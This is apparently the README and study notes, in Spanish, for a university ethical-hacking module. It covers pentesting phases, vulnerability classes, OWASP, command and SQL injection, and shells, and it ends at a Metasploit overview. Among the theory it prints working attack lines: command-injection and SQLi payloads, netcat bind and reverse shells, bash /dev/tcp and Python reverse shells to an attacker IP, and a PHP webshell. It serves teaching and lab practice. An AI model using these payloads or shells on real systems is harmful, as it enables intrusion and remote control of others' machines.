<h1 align="center">🛡️ Hacking Ético — Máster en Ciberseguridad</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.x-blue?logo=python&logoColor=white" alt="Python">
  <img src="https://img.shields.io/badge/Kali_Linux-557C94?logo=kalilinux&logoColor=white" alt="Kali Linux">
  <img src="https://img.shields.io/badge/TryHackMe-red?logo=tryhackme&logoColor=white" alt="TryHackMe">
  <img src="https://img.shields.io/badge/Docker-2496ED?logo=docker&logoColor=white" alt="Docker">
  <img src="https://img.shields.io/badge/Módulo-Hacking%20Ético-darkred" alt="Módulo">
  <img src="https://img.shields.io/badge/Máster-Ciberseguridad-gold" alt="Máster">
</p>

<p align="center">
  <i>
    Repositorio de prácticas, retos CTF y laboratorios del módulo de Hacking Ético.<br>
    Este documento es el cuaderno de estudio del módulo — toda la teoría del temario documentada y enlazada con las prácticas de este repositorio.
  </i>
</p>

---

## 📁 Contenido del Repositorio

```
hacking-etico-master/
└── ctf/
    ├── challs/                     ← 10 retos CTF sobre TCP con Twisted
    │   ├── retos/                  ← c1.py … c10.py  (módulo Python)
    │   ├── imagenes/               ← capturas pendientes de writeups
    │   ├── server.py               ← runner unificado con Twisted
    │   ├── Dockerfile
    │   ├── docker-compose.yml
    │   ├── solver_c3_bruteforce.py
    │   ├── solver_c7_bigsum.py
    │   └── README.md
    ├── thm/
    │   └── easy/
    │       ├── pickle-rick/        ← Autopwn: RCE → Reverse Shell → Escalada → SSH
    │       │   ├── archivo_pocs/   ← PoC-00 … PoC-09 (evolución del ataque)
    │       │   ├── automatizacion/ ← autoprick.py (script final)
    │       │   ├── imagenes/
    │       │   └── README.md
    │       └── wgel-ctf/           ← Recon → .ssh expuesto → sudo wget → root
    │           ├── imagenes/       ← 19 capturas del writeup
    │           └── README.md
    └── laboratorios/
        └── httprce-jailbreak/      ← Lab local: HTTP RCE API + Python Jailbreak
            ├── imagenes/
            ├── api_rce.py          ← Flask RESTful con endpoint de CMDi
            ├── jailbreak.py        ← Shell interactiva con blacklist defectuosa
            ├── exploit_jail.sh     ← Demo de bypass por base64
            ├── requirements.txt
            └── README.md
```

| Proyecto | Vectores practicados | Writeup |
|:---|:---|:---:|
| 🧩 **challs** | Criptografía, hashing, CMDi, aritmética, Python jailbreak | [README](ctf/challs/README.md) |
| 🥒 **pickle-rick** | CMDi, RCE, Reverse Shell, escalada de privilegios, persistencia SSH | [README](ctf/thm/easy/pickle-rick/README.md) |
| 🫠 **wgel-ctf** | Reconocimiento, enumeración web, clave SSH expuesta, sudo abuse | [README](ctf/thm/easy/wgel-ctf/README.md) |
| 🔓 **httprce-jailbreak** | HTTP RCE directa, Python Jailbreak con blacklist bypasseable | [README](ctf/laboratorios/httprce-jailbreak/README.md) |

---

## 📑 Índice Teórico

1. [Pentesting](#-1--pentesting)
2. [Tipos de Pentesting](#-2--tipos-de-pentesting)
3. [Fases del Pentesting](#️-3--fases-del-pentesting)
4. [Vulnerabilidades — Clasificación](#-4--vulnerabilidades--clasificación)
5. [Identificación: CVE y CVSS](#️-5--identificación-cve-y-cvss)
6. [Consultar Vulnerabilidades](#-6--consultar-vulnerabilidades)
7. [Vulnerabilidades Web y OWASP Top 10](#-7--vulnerabilidades-web-y-owasp-top-10)
8. [Command Injection (CMDi)](#-8--command-injection-cmdi)
9. [SQL Injection (SQLi)](#️-9--sql-injection-sqli)
10. [Shells — Bind, Reverse y Restringidas](#-10--shells--bind-reverse-y-restringidas)
11. [Reverse Shells, Metasploit y C2](#-11--reverse-shells-metasploit-y-c2)
12. [Crear Malware con msfvenom](#-12--crear-malware-con-msfvenom)
13. [Análisis de Tráfico de Reverse Shells](#-13--análisis-de-tráfico-de-reverse-shells)

---

> [!WARNING]
> **Aviso legal.** Todo el contenido de este repositorio tiene fines exclusivamente académicos. Las técnicas documentadas se han aplicado únicamente sobre infraestructura propia o plataformas de entrenamiento como TryHackMe. El uso de estas técnicas sobre sistemas sin autorización expresa es ilegal y contravinene los marcos legales de cualquier jurisdicción. El autor declina toda responsabilidad por un uso indebido de esta información.

---

## 🔍 1 — Pentesting

El **pentesting** —o prueba de penetración— es un proceso de evaluación de seguridad que consiste en realizar ataques simulados contra un sistema, red o aplicación con el objetivo de identificar y explotar vulnerabilidades de forma controlada. La diferencia fundamental entre un pentester y un atacante malicioso no está en las técnicas utilizadas, sino en el **marco ético y legal** bajo el que opera: un pentester actúa con autorización explícita del propietario del sistema con el fin de mejorar sus defensas, no de comprometerlas.

El valor del pentesting reside en su capacidad de revelar debilidades antes de que un actor malicioso real las descubra. Un análisis teórico o un escáner automatizado de vulnerabilidades puede detectar problemas conocidos, pero solo un pentester humano puede encadenar vulnerabilidades individuales —cada una de ellas quizás de bajo impacto por separado— para demostrar un compromiso total del sistema.

### Objetivos del Pentesting

| Objetivo | Descripción |
|:---|:---|
| **Identificación de vulnerabilidades** | Detectar puntos débiles en sistemas o aplicaciones antes de que sean explotados por atacantes reales |
| **Evaluación del riesgo** | Estimar el impacto de cada vulnerabilidad en términos de **confidencialidad**, **integridad** y **disponibilidad** (tríada CIA) |
| **Recomendación de soluciones** | Proponer medidas correctivas y preventivas específicas para mitigar cada hallazgo |
| **Cumplimiento normativo** | Verificar que la infraestructura cumple con estándares como PCI-DSS, ISO 27001 o el ENS en España |

### Tipos de sistemas evaluados

Los sistemas sobre los que se realiza pentesting son muy variados y cada tipo tiene sus propias metodologías y herramientas: **aplicaciones web** (el vector más frecuente en la práctica), **servidores y redes** tanto internas como expuestas al exterior, **dispositivos móviles** con sus aplicaciones y APIs asociadas, e **infraestructura en la nube** desplegada sobre proveedores como AWS, Azure o Google Cloud.

---

## 🎭 2 — Tipos de Pentesting

La cantidad de información que el pentester recibe antes de comenzar define el enfoque del trabajo y determina qué técnicas son más relevantes. Existen tres modalidades principales, ninguna objetivamente superior a las otras — cada una sirve propósitos distintos.

### Caja Blanca (White Box)

El pentester recibe **acceso completo** a la información interna del sistema antes de comenzar: documentación de arquitectura, código fuente, configuraciones, credenciales de usuario y mapas de red. Este conocimiento permite realizar pruebas exhaustivas enfocadas en la lógica interna, detectar errores de diseño y auditar el código línea a línea. Se asemeja a una auditoría interna profunda más que a una simulación de ataque exterior.

- **Ventajas:** Mayor cobertura, detección de vulnerabilidades ocultas en la lógica interna, pruebas más rápidas al eliminar la fase de reconocimiento
- **Desventajas:** No refleja cómo actuaría un atacante externo real; el realismo es bajo porque un atacante nunca partiría con tanta información

### Caja Negra (Black Box)

El pentester no recibe absolutamente ninguna información previa. Empieza desde cero exactamente igual que un atacante externo: con solo la IP o el dominio del objetivo. Todo el reconocimiento, la enumeración y la identificación de vectores de ataque se realiza de forma autónoma. Es el enfoque más realista para simular un ataque externo real.

- **Ventajas:** Máximo realismo, identifica exactamente lo que un atacante externo podría encontrar
- **Desventajas:** Mayor inversión de tiempo, puede no detectar vulnerabilidades internas profundas inaccesibles desde el exterior

> [!NOTE]
> Los CTFs de TryHackMe como **Pickle Rick** o **Wgel CTF** utilizan metodología de caja negra pura: solo se recibe la IP de la máquina objetivo.

### Caja Gris (Grey Box)

Enfoque intermedio: el pentester recibe información parcial, como credenciales de un usuario estándar o un diagrama de red limitado. Simula el escenario de un empleado interno malintencionado o un atacante que ya ha comprometido una cuenta de bajo privilegio y quiere escalar. Combina técnicas de reconocimiento externo con pruebas más dirigidas gracias a la información disponible.

- **Ventajas:** Balance entre profundidad de análisis y realismo, más eficiente que black box al reducir el tiempo de reconocimiento
- **Desventajas:** La calidad del resultado depende de la calidad de la información parcial suministrada

### Tabla Comparativa

| Tipo de pentesting | Acceso preconcedido | Realismo frente a ataque externo | Profundidad de pruebas |
|:---:|:---:|:---:|:---:|
| 🟦 **Caja Blanca** | Completo | 🔴 Bajo | 🟢 Alta |
| ⬛ **Caja Negra** | Ninguno | 🟢 Alto | 🔴 Baja |
| 🔲 **Caja Gris** | Parcial | 🟡 Medio | 🟡 Media |

---

## ⚙️ 3 — Fases del Pentesting

El proceso de pentesting no es improvisado. Sigue una secuencia estructurada de fases que garantiza que ningún vector quede sin explorar y que todas las acciones queden documentadas. Estas fases son universales — están presentes en todas las metodologías consolidadas del sector, como OWASP Testing Guide, PTES o NIST SP 800-115.

### Fase 1 — Reconocimiento

La fase inicial tiene como objetivo **recopilar la mayor cantidad posible de información sobre el objetivo sin interactuar con él de forma intrusiva**. Cuanta más información se reúna aquí, más eficientes serán las fases posteriores.

Se distinguen dos variantes:

- **Reconocimiento pasivo:** se obtiene información sin tocar el sistema objetivo. Búsquedas OSINT, consultas DNS públicas (`nslookup`, `dig`), análisis de metadatos de documentos publicados, `whois`, certificados SSL o información en LinkedIn sobre el equipo técnico de la organización.
- **Reconocimiento activo:** se interactúa directamente con el objetivo mediante escaneos de puertos, fingerprinting de servicios o mapeo de red. Esta interacción deja trazas en los logs del sistema objetivo.

> [!TIP]
> 📌 **En este repo:** Wgel CTF — reconocimiento activo con `nmap -sS -T4` contra la IP del objetivo. Resultado: puertos 22 (SSH) y 80 (HTTP). → [Ver writeup](ctf/thm/easy/wgel-ctf/README.md)

### Fase 2 — Escaneo

Con la información inicial recopilada, se realiza un análisis más detallado y técnico de los sistemas identificados. El objetivo es enriquecer el mapa de superficie de ataque con datos concretos:

- **Puertos abiertos y servicios:** versiones exactas de software en cada puerto, ya que las versiones tienen CVEs asociados
- **Enumeración de directorios y recursos:** en aplicaciones web, se descubren rutas no enlazadas públicamente
- **Identificación de vulnerabilidades:** herramientas como `nessus`, `OpenVAS` o `nikto` automatizan la búsqueda de fallos conocidos

> [!TIP]
> 📌 **En este repo:** Triple pasada de `gobuster` en Wgel CTF con tres wordlists distintas hasta descubrir `/.ssh/` con la clave RSA privada expuesta. → [Ver writeup](ctf/thm/easy/wgel-ctf/README.md)

### Fase 3 — Explotación

El pentester intenta aprovechar las vulnerabilidades identificadas para **obtener acceso no autorizado al sistema**, demostrar el impacto real de los fallos encontrados. Esta es la fase que el público general asocia con el "hacking": el momento en que las vulnerabilidades dejan de ser teóricas y se convierten en accesos reales.

La explotación puede realizarse con herramientas como Metasploit, exploits de bases de datos públicas (Exploit-DB) o exploits propios. Es imprescindible documentar rigurosamente cada acción realizada para no comprometer irreversiblemente el sistema y poder reproducir los pasos en el informe final.

> [!TIP]
> 📌 **En este repo:** Pickle Rick — explotación del panel de comandos vulnerable a CMDi directa, con escalada desde RCE a reverse shell Python pura. → [Ver PoC-02](ctf/thm/easy/pickle-rick/archivo_pocs/)

### Fase 4 — Post-Explotación

Una vez dentro del sistema, el pentester evalúa qué podría hacer un atacante real que hubiera llegado hasta este punto. Las actividades típicas incluyen:

- **Mantener el acceso (persistencia):** instalación de backdoors, crontabs maliciosos, usuarios ocultos, o inyección de claves SSH en `authorized_keys`
- **Escalada de privilegios:** pasar de un usuario estándar a root o administrador, lo que amplía radicalmente el impacto
- **Movimiento lateral:** acceso a otras máquinas de la red interna desde el sistema comprometido
- **Exfiltración de datos:** extracción de credenciales, ficheros confidenciales, configuraciones críticas

> [!TIP]
> 📌 **En este repo:** Pickle Rick PoC-08 implementa persistencia SSH inyectando la clave pública del atacante en `/root/.ssh/authorized_keys`. Wgel CTF — exfiltración del fichero de root mediante `sudo wget --post-file` con listener `nc`. → [Ver writeups](ctf/thm/easy/)

### Fase 5 — Informe de Resultados

La fase final y, en muchos sentidos, la más importante desde el punto de vista profesional. El informe es el producto entregable del pentesting — lo que justifica el trabajo realizado y permite a la organización mejorar su seguridad. Un buen informe de pentesting contiene:

- **Descripción técnica detallada** de cada vulnerabilidad encontrada con la metodología usada para identificarla
- **Evaluación del impacto** de cada hallazgo sobre la confidencialidad, integridad y disponibilidad
- **Evidencias:** capturas de pantalla, logs, payloads utilizados
- **Recomendaciones de mitigación** específicas y priorizadas por criticidad

---

## 🔴 4 — Vulnerabilidades — Clasificación

Una **vulnerabilidad** es una debilidad o fallo en un sistema, red o software que puede ser explotada por un atacante para comprometer la **confidencialidad**, la **integridad** o la **disponibilidad** de los datos y recursos — la conocida tríada CIA. Estas debilidades no surgen por accidente: aparecen a causa de errores en el diseño, en la implementación, en la configuración o en el mantenimiento de los sistemas.

Clasificar las vulnerabilidades según el tipo de ataque que permiten ayuda a entender su naturaleza y a priorizar las defensas. Las categorías fundamentales son:

### Ejecución de Código (Code Execution / RCE)

Permite a un atacante ejecutar código malicioso en el sistema objetivo, comprometiendo potencialmente el control total del equipo o la red. Es la vulnerabilidad más grave en términos de impacto, ya que el atacante puede hacer prácticamente cualquier cosa que el proceso afectado tenga permiso para hacer.

Ejemplos representativos: **desbordamiento de búfer** (buffer overflow), donde se introduce más datos de los que el programa puede manejar y el atacante redirige la ejecución; y la **inyección de comandos** (CMDi), donde una entrada de usuario se pasa directamente a `shell_exec()` o `os.system()` sin sanitizar.

### Bypass

Permite eludir mecanismos de seguridad — autenticación, validación de usuarios, restricciones de acceso o filtros de entrada — sin necesidad de explotarlos directamente. El atacante no rompe el candado, lo rodea.

Ejemplos representativos: **authentication bypass** cuando un fallo en la lógica de validación permite acceder sin credenciales válidas; y **bypass de filtros** cuando un WAF o una lista negra puede evaderse mediante codificación alternativa (URL encoding, base64, Unicode) o fragmentación del payload.

### Escalada de Privilegios (Privilege Escalation)

Permite a un usuario con acceso limitado obtener mayores permisos dentro del sistema, habitualmente hasta alcanzar acceso root o de administrador. Un atacante que solo ha conseguido una cuenta de usuario estándar puede pasar a controlar completamente el sistema.

Ejemplos representativos: explotación de fallos en el **kernel del sistema operativo**; abuso de **binarios con SUID** mal configurados; y explotación de entradas de **sudoers** que permiten ejecutar ciertos binarios como root sin contraseña (el caso clásico de `sudo wget` que aparece en Wgel CTF).

### Denegación de Servicio (Denial of Service — DoS)

Permite a un atacante sobrecargar un sistema hasta hacerlo inaccesible para sus usuarios legítimos. A diferencia de los tipos anteriores, el objetivo no es obtener acceso sino interrumpir la disponibilidad del servicio. En su variante distribuida (DDoS), múltiples equipos coordinados amplifican el impacto exponencialmente.

Ejemplos representativos: **inundación de solicitudes** (SYN flood, HTTP flood) que agotan los recursos del servidor; y explotación de fallos en el manejo de memoria de ciertas versiones de software que provocan un crash del servicio.

### Fuga de Información (Information Leak)

Permite acceder a datos sensibles que deberían estar protegidos. Esta categoría es a menudo subestimada, pero la información filtrada puede ser exactamente lo que un atacante necesita para planificar un ataque más sofisticado en una segunda fase.

Ejemplos representativos: **errores de configuración** que exponen ficheros de configuración, contraseñas hardcodeadas o listados de directorio; y **error leakage**, donde mensajes de error mal gestionados revelan detalles internos como rutas absolutas de ficheros, versiones de librerías o estructura de la base de datos.

---

## 🏷️ 5 — Identificación: CVE y CVSS

Para que la comunidad de ciberseguridad pueda hablar de vulnerabilidades concretas sin ambigüedades, existen sistemas estandarizados de identificación y puntuación que se han convertido en el lenguaje común del sector.

### CVE — Common Vulnerabilities and Exposures

El CVE es un sistema de identificación mantenido por **MITRE Corporation** con el apoyo del Departamento de Seguridad Nacional de Estados Unidos. Cada vulnerabilidad pública conocida recibe un identificador único que sigue el formato `CVE-<año>-<número>`, por ejemplo `CVE-2023-12345`. Este código permite que fabricantes, investigadores, administradores de sistemas y herramientas de seguridad se refieran a la misma vulnerabilidad sin confusión, independientemente del idioma o la plataforma.

Es importante aclarar que el CVE actúa como **identificador** — no proporciona detalles técnicos profundos por sí solo. La información detallada se encuentra en bases de datos especializadas como la NVD, que toman los CVE IDs como referencia.

### CVSS — Common Vulnerability Scoring System

El CVSS es el estándar abierto para **medir y comunicar la gravedad** de las vulnerabilidades. Permite a los equipos de seguridad priorizar cuáles parchear primero basándose en criterios objetivos y reproducibles. La puntuación se construye a partir de tres componentes:

| Componente | Qué mide |
|:---|:---|
| **Base Score** | Severidad intrínseca de la vulnerabilidad, independiente del entorno donde se encuentre |
| **Temporal Score** | Ajuste según el estado actual: ¿existe un exploit público? ¿hay ya un parche disponible? |
| **Environmental Score** | Ajuste personalizado según el impacto específico en la organización evaluada |

La escala va de 0 a 10 y se interpreta del siguiente modo:

| Rango | Nivel | Postura recomendada |
|:---:|:---:|:---|
| 0.1 – 3.9 | 🟢 **Bajo** | Monitorizar y planificar corrección en próximo ciclo |
| 4.0 – 6.9 | 🟡 **Medio** | Planificar corrección a corto plazo |
| 7.0 – 8.9 | 🟠 **Alto** | Abordar de forma urgente — riesgo real de explotación |
| 9.0 – 10.0 | 🔴 **Crítico** | Parchear de forma inmediata — explotación trivial y/o sin autenticación |

---

## 🔎 6 — Consultar Vulnerabilidades

Conocer los sistemas de identificación es útil solo si se sabe dónde buscar la información detallada. Las dos referencias principales de la industria son:

### CVE Details — [cvedetails.com](https://www.cvedetails.com)

Interfaz amigable sobre la base de datos CVE que facilita búsquedas rápidas por nombre de producto, versión o fabricante. Para cada CVE muestra el score CVSS, los productos afectados, estadísticas históricas y enlaces a exploits relacionados y a la entrada correspondiente en la NVD. Es especialmente útil cuando se quiere responder a la pregunta: *¿qué versiones de este software tienen vulnerabilidades conocidas y cuál es la más grave?*

### NVD — National Vulnerability Database — [nvd.nist.gov](https://nvd.nist.gov)

Mantenida por el **NIST** (Instituto Nacional de Estándares y Tecnología de Estados Unidos), la NVD es la base de datos oficial de referencia. Para cada CVE proporciona descripciones técnicas exhaustivas, puntuaciones CVSS detalladas y desglosadas por vector, referencias a recursos adicionales, guías de mitigación y listados de productos afectados con rangos de versión precisos. Es la fuente que debe consultarse cuando se necesita entender en profundidad la naturaleza técnica de una vulnerabilidad y las medidas de corrección recomendadas.

| | CVE Details | NVD |
|:---|:---:|:---:|
| **Uso ideal** | Búsqueda rápida por producto | Análisis técnico en profundidad |
| **Interfaz** | Intuitiva y visual | Más técnica y estructurada |
| **CVSS detallado** | Parcial | Completo y desglosado |
| **Guías de mitigación** | Limitadas | Extensas |

---

## 🌐 7 — Vulnerabilidades Web y OWASP Top 10

Una **vulnerabilidad web** es un fallo en el código de una aplicación que puede ser explotado para alterar su comportamiento normal: acceder a datos no autorizados, ejecutar operaciones no previstas o tomar control del servidor. Con el creciente volumen de servicios críticos operando vía web — banca, administración pública, comercio electrónico, comunicaciones — las aplicaciones web son hoy el vector de ataque más frecuente. Manejan volúmenes enormes de datos sensibles y son accesibles desde cualquier conexión a Internet, lo que las convierte en un objetivo permanente.

### Vulnerabilidades Comunes

Antes de entrar en el detalle de CMDi y SQLi, conviene conocer el ecosistema completo de vulnerabilidades web más habituales:

| Tipo | Descripción | Impacto típico |
|:---|:---|:---|
| **XSS** (Cross-Site Scripting) | Inyección de scripts maliciosos en páginas vistas por otros usuarios | Robo de sesiones/cookies, phishing, defacement |
| **CSRF** (Cross-Site Request Forgery) | Fuerza a un usuario autenticado a ejecutar acciones no deseadas sin su conocimiento | Cambios de datos, transferencias no autorizadas |
| **RCE** (Remote Code Execution) | Ejecución de código arbitrario en el servidor | Control total del servidor |
| **CMDi** (Command Injection) | Ejecución de comandos del SO vía aplicación web vulnerable | Acceso al sistema, reverse shell |
| **SQLi** (SQL Injection) | Manipulación de consultas SQL mediante entradas no sanitizadas | Exfiltración de datos, bypass de autenticación |

### OWASP Top 10 (2021)

El **OWASP Top 10** es la lista de referencia global de las vulnerabilidades web más críticas, publicada y actualizada periódicamente por el Open Web Application Security Project. Su propósito es educar a desarrolladores, arquitectos y administradores sobre los riesgos más relevantes y ayudarles a priorizarlos en sus procesos de desarrollo seguro.

| ID | Nombre | Descripción |
|:---:|:---|:---|
| **A01** | Broken Access Control | Los controles de acceso no están correctamente implementados — usuarios acceden a recursos o funciones no autorizados |
| **A02** | Cryptographic Failures | Protección insuficiente de datos sensibles: algoritmos débiles, falta de cifrado en tránsito o en reposo |
| **A03** | Injection | SQL, LDAP, XPath, CMDi — datos no confiables interpretados como código ejecutable |
| **A04** | Insecure Design | Fallos de seguridad en la propia arquitectura de la aplicación, antes de escribir una sola línea de código |
| **A05** | Security Misconfiguration | Componentes con configuración por defecto insegura o con permisos excesivos |
| **A06** | Vulnerable & Outdated Components | Librerías, frameworks o módulos desactualizados con CVEs conocidos sin parchear |
| **A07** | Identification & Authentication Failures | Fallos en autenticación que permiten la suplantación de identidad o el acceso sin credenciales |
| **A08** | Software & Data Integrity Failures | Ausencia de validación en actualizaciones de software — permite introducir código malicioso en el pipeline |
| **A09** | Security Logging & Monitoring Failures | Sin registro y monitoreo adecuados, los ataques no se detectan ni se responden a tiempo |
| **A10** | SSRF | Server-Side Request Forgery — el servidor realiza solicitudes no autorizadas a servicios internos o externos |

> [!NOTE]
> 📌 **En este repo:** Wgel CTF cubre **A02** (clave SSH expuesta públicamente) y **A05** (directorio `.ssh` sin control de acceso). El lab `httprce-jailbreak` y Pickle Rick cubren **A03** (CMDi directa en Flask y en panel web PHP).

---

## 💣 8 — Command Injection (CMDi)

El **command injection** o inyección de comandos ocurre cuando una aplicación ejecuta comandos del sistema operativo construidos a partir de entradas del usuario **sin validarlas ni sanitizarlas** correctamente. El resultado es que el atacante puede insertar comandos adicionales que se ejecutan con los mismos privilegios que el proceso de la aplicación — a menudo, el usuario del servidor web.

El mecanismo es conceptualmente simple. Considérese una aplicación PHP que ofrece funcionalidad de ping:

```php
<?php
$ip = $_GET['ip'];
$output = shell_exec("ping -c 4 " . $ip);
echo "<pre>$output</pre>";
?>
```

El parámetro `ip` se concatena directamente al comando sin ningún filtro. Un atacante no introduce solo una IP, sino que aprovecha los operadores de encadenamiento de la shell para añadir comandos propios:

```
http://example.com/ping.php?ip=8.8.8.8;cat /etc/passwd
```

El servidor ejecuta `ping -c 4 8.8.8.8; cat /etc/passwd` — primero el ping y después una lectura del fichero de usuarios del sistema.

### Operadores de encadenamiento en bash

| Operador | Comportamiento |
|:---:|:---|
| `;` | Ejecuta ambos comandos siempre, independientemente del resultado del primero |
| `&&` | Ejecuta el segundo solo si el primero ha terminado con éxito (exit code 0) |
| `\|\|` | Ejecuta el segundo solo si el primero ha fallado |
| `\|` | Pipe — pasa la salida estándar del primero como entrada del segundo |
| `` `cmd` `` o `$(cmd)` | Sustitución de comandos — el resultado se incrusta en el contexto del comando padre |

### Pasos de explotación de CMDi

La explotación de un CMDi sigue un proceso incremental. Primero se **identifica la vulnerabilidad** enviando comandos simples para confirmar la ejecución: `id`, `whoami`, `echo test`. A continuación se **explora el sistema**: contenido de ficheros clave (`/etc/passwd`, `/etc/shadow`), variables de entorno, procesos activos. Finalmente, el atacante puede **escalar el impacto** obteniendo una reverse shell interactiva que le da control total del sistema, buscar credenciales almacenadas en ficheros de configuración o intentar moverse lateralmente a otras máquinas de la red.

> [!TIP]
> 📌 **En este repo:** Pickle Rick expone un panel web con CMDi directa sobre el sistema operativo. El lab `api_rce.py` de `httprce-jailbreak` implementa `subprocess.run(cmd, shell=True)` con el parámetro de URL sin sanitizar. → [Pickle Rick](ctf/thm/easy/pickle-rick/README.md) | [httprce-jailbreak](ctf/laboratorios/httprce-jailbreak/README.md)

---

## 🗄️ 9 — SQL Injection (SQLi)

El **SQL injection** ocurre cuando una aplicación incorpora datos del usuario directamente en consultas SQL sin la debida validación, permitiendo al atacante inyectar código SQL propio que altera la lógica de la consulta. El resultado puede ser desde acceso no autorizado a datos hasta la ejecución de operaciones administrativas sobre el servidor de base de datos.

El caso más básico es la bypass de autenticación. Una aplicación con este código vulnerable:

```php
<?php
$username = $_GET['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($connection, $query);
?>
```

Puede ser engañada con el payload `' OR '1'='1`, que convierte la consulta en:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1';
```

La condición `'1'='1'` es siempre verdadera — la consulta devuelve todos los registros de la tabla sin necesidad de conocer ninguna credencial.

### Tipos de SQL Injection

**Inyección Clásica o In-Band** es el tipo más común y ocurre cuando el resultado de la consulta manipulada es visible directamente en la respuesta HTTP:

- **Basada en errores:** el atacante induce deliberadamente errores en la base de datos para extraer información útil de los mensajes de error generados (versión del motor, nombre de tablas, etc.)
- **UNION-based:** se añade una cláusula `UNION SELECT` para combinar los resultados de la consulta legítima con los de una consulta adicional sobre otras tablas, extrayendo datos de todo el esquema

**Blind SQL Injection** aplica cuando la aplicación no muestra resultados directamente — el atacante debe inferir información del comportamiento de la aplicación:

- **Boolean-based:** se hacen consultas cuya respuesta es binaria (verdadero/falso) y se deduce información carácter a carácter. `' AND SUBSTRING(password,1,1)='a'--` respondería diferente si el primer carácter de la contraseña es 'a'
- **Time-based:** se inyectan funciones de retardo (`SLEEP(n)` en MySQL, `WAITFOR DELAY` en MSSQL) y el atacante mide el tiempo de respuesta — si el servidor tarda, la condición evaluada era verdadera

---

## 🐚 10 — Shells — Bind, Reverse y Restringidas

En el contexto de la seguridad ofensiva, una **shell** es el objetivo final de la mayoría de los ataques: una interfaz de comandos que da acceso interactivo al sistema operativo del servidor comprometido. Una vez que el atacante tiene una shell, puede ejecutar cualquier comando que el usuario del proceso le permita, acceder al sistema de ficheros, instalar herramientas adicionales o iniciar la fase de post-explotación.

### Bind Shell

En una bind shell el **servidor comprometido abre un puerto y espera** a que el atacante se conecte. La máquina víctima actúa como servidor y el atacante como cliente.

```bash
# En el servidor comprometido — abre una bash en el puerto 4444
nc -lvp 4444 -e /usr/bin/bash

# El atacante se conecta desde su máquina
nc <IP_SERVIDOR> 4444
```

La limitación práctica de la bind shell es que la mayoría de los entornos de producción tienen **firewalls que bloquean conexiones entrantes** a puertos arbitrarios. El atacante no puede conectarse si el tráfico entrante está filtrado.

### Reverse Shell

La reverse shell invierte los roles: es la **máquina comprometida la que inicia la conexión** hacia el atacante. Mientras que los firewalls habitualmente son estrictos con el tráfico entrante, suelen ser más permisivos con el tráfico saliente — razón por la que la reverse shell es la técnica preferida en entornos reales.

```bash
# Atacante — escucha en su máquina
nc -lvnp 4444

# En el servidor comprometido — inicia la conexión de vuelta
nc <IP_ATACANTE> 4444 -e /bin/bash
```

> [!TIP]
> El generador online **[revshells.com](https://revshells.com)** permite obtener reverse shells listas para usar en docenas de lenguajes y con su listener correspondiente, simplemente introduciendo la IP y el puerto.

> [!TIP]
> 📌 **En este repo:** Pickle Rick PoC-04 implementa una reverse shell Python pura desde cero. → [Ver PoC-04](ctf/thm/easy/pickle-rick/archivo_pocs/)

### Shells Restringidas y Jailbreak

Una **shell restringida** es un entorno de línea de comandos con limitaciones impuestas por el administrador para controlar qué puede hacer el usuario y evitar daños o accesos a áreas críticas del sistema. Las implementaciones más comunes son:

- **rbash (restricted bash):** versión de Bash que deshabilita `cd`, la modificación de variables de entorno como `$PATH`, la redirección de salida a ficheros y la ejecución de comandos con rutas absolutas
- **Entornos chroot:** "jaula" al usuario en un subdirectorio del sistema de ficheros — desde dentro, ese directorio es la raíz `/` del sistema, y el usuario no tiene acceso al sistema de ficheros real

Aunque estas restricciones parecen robustas, los atacantes disponen de técnicas consolidadas para escapar de ellas — el proceso conocido como **jailbreak**:

- **Invocar una shell desde comandos permitidos:** editores como `vi`, `nano` o `less` permiten ejecutar comandos del sistema. En `vi`: `:!/bin/bash` abre una bash completa sin restricciones
- **Scripts Python o Perl:** `python -c "import pty; pty.spawn('/bin/bash')"` lanza una shell interactiva completa desde Python
- **Explotación de binarios con privilegios elevados:** si existen programas SUID o entradas en `sudoers` que permiten ejecutar ciertos binarios como root, pueden usarse para escapar de la jaula consultando **GTFOBins** (`sudo wget`, `sudo vim`, `sudo python`, etc.)

> [!TIP]
> 📌 **En este repo:** Reto 4 de `challs` implementa un REPL con `eval()` y `__builtins__=None` — el clásico Python jailbreak. El lab `jailbreak.py` de `httprce-jailbreak` tiene una blacklist bypasseable por un fallo lógico en la comprobación del primer token. Wgel CTF usa `sudo wget` de GTFOBins para exfiltrar la flag de root. → [challs](ctf/challs/README.md) | [httprce-jailbreak](ctf/laboratorios/httprce-jailbreak/README.md) | [wgel](ctf/thm/easy/wgel-ctf/README.md)

---

## 🎯 11 — Reverse Shells, Metasploit y C2

### Crear Reverse Shells — Lenguajes disponibles

Una reverse shell puede implementarse en prácticamente cualquier lenguaje con capacidades de red. La elección depende de qué intérpretes o compiladores hay disponibles en el servidor comprometido:

| Lenguaje | Ventaja principal | Uso típico |
|:---|:---|:---|
| **Bash** | Disponible en cualquier sistema Unix/Linux | Servidores Linux con CMDi directa |
| **Python** | Versátil, frecuentemente instalado en servidores | La opción más universal en Linux |
| **PHP** | Ideal en servidores web — interactúa con el contexto HTTP | Aplicaciones PHP con webshell |
| **C / C++** | Bajo nivel, alto rendimiento, control total | Implantes compilados para evasión |

**Ejemplos con IP atacante `192.168.1.5` y puerto `4444`:**

```bash
# Bash
sh -i >& /dev/tcp/192.168.1.5/4444 0>&1

# Listener universal para todos los casos
rlwrap nc -lvnp 4444
```

```python
# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
```

```php
# PHP — webshell que acepta comandos vía parámetro GET
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; die; }?>
```

### Metasploit

**Metasploit** es el framework de pentesting más utilizado del mundo. Fue creado originalmente por H.D. Moore en 2003 y actualmente es mantenido por **Rapid7**. Su objetivo es proporcionar a los profesionales de seguridad una plataforma integral para investigar vulnerabilidades, desarrollar y lanzar exploits, y gestionar sistemas comprometidos. Su arquitectura se basa en módulos independientes:

| Módulo | Función |
|:---|:---|
| **Exploits** | Código que aprovecha una vulnerabilidad específica para obtener ejecución de código en el sistema objetivo |
| **Payloads** | Código que se ejecuta en el sistema comprometido una vez que el exploit ha tenido éxito (reverse shell, meterpreter, etc.) |
| **Encoders** | Codifican el payload para evadir la detección por firmas estáticas de antivirus e IDS |
